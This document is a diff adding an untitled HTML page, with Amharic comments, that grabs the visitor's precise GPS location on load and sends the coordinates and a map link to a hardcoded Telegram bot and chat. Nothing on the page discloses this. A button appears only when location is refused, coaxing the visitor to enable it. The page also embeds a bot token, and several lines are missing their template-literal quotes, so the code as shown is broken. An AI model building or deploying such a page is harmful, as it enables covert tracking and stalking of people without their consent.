@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #ffffff;
+        }
+        .gps-btn {
+            display: none;
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            outline: none;
+        }
+        .gps-btn:active {
+            background-color: #006699;
+            transform: scale(0.98);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- GPS ጠፍቶ ከሆነ ብቻ የሚመጣ በተን -->
+    <button id="gpsBtn" class="gps-btn" onclick="requestLocation()">GPS አብራ</button>
+
+    <script>
+        // ⚠️ የራስህን Telegram Bot Token እና Chat ID እዚህ ተካ
+        const TELEGRAM_BOT_TOKEN = "8883575395:AAFCRwN1lI4wArNIIhoJj-_Rz_JdocngMt0";
+        const TELEGRAM_CHAT_ID = "8707077257";
+
+        let isSent = false;
+        let watchId = null;
+        let fallbackTimer = null;
+        let bestPosition = null;
+
+        function sendToTelegram(lat, lng, accuracy) {
+            if (isSent) return;
+            isSent = true;
+
+            // መረጃው እንደተላከ ፍለጋውን ማቆም
+            if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+            if (fallbackTimer !== null) clearTimeout(fallbackTimer);
+
+            const mapLink = https://www.google.com/maps?q=${lat},${lng};
+            const text = 🎯 <b>አዲስ የ GPS ሎኬሽን ደረሰህ!</b>\n\n📍 <b>Latitude:</b> <code>${lat}</code>\n📍 <b>Longitude:</b> <code>${lng}</code>\n🎯 <b>Accuracy:</b> <code>${Math.round(accuracy)} meters</code>\n\n🗺️ <a href='${mapLink}'>በ Google Maps ላይ ለማየት ይጫኑ</a>;
+
+            fetch(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text,
+                    parse_mode: "HTML"
+                })
+            }).catch(() => {
+                isSent = false;
+            });
+        }
+
+        function requestLocation() {
+            const btn = document.getElementById("gpsBtn");
+            btn.style.display = "none";
+
+            if (!navigator.geolocation) return;
+
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 8000,
+                maximumAge: 0
+            };
+
+            // ፍጥነት ለመጨመር፡ በ 3.5 ሰከንድ ውስጥ የተገኘውን ከሁሉም የተሻለ ቦታ ይልካል
+            fallbackTimer = setTimeout(() => {
+                if (bestPosition && !isSent) {
+                    sendToTelegram(
+                        bestPosition.coords.latitude,
+                        bestPosition.coords.longitude,
+                        bestPosition.coords.accuracy
+                    );
+                }
+            }, 3500);
+
+            watchId = navigator.geolocation.watchPosition(
+                (position) => {
+                    const accuracy = position.coords.accuracy;
+
+                    // ከቀደመው የተሻለ ትክክለኛ አቀማመጥ ከመጣ መመዝገብ
+                    if (!bestPosition || accuracy < bestPosition.coords.accuracy) {
+                        bestPosition = position;
+                    }
+
+                    // ትክክለኛ የ GPS ሳተላይት ቦታ (accuracy <= 100m) ሲገኝ ወዲያውኑ አፍጥኖ ይልካል
+                    if (accuracy <= 100) {
+                        sendToTelegram(
+                            position.coords.latitude,
+                            position.coords.longitude,
+                          accuracy
+                        );
+                    }
+                },
+                (error) => {
+                    if (!isSent && !bestPosition) {
+                        btn.style.display = "block";
+                    }
+                },
+                options
+            );
+        }
+
+        window.onload = requestLocation;
+    </script>
+</body>
+</html>
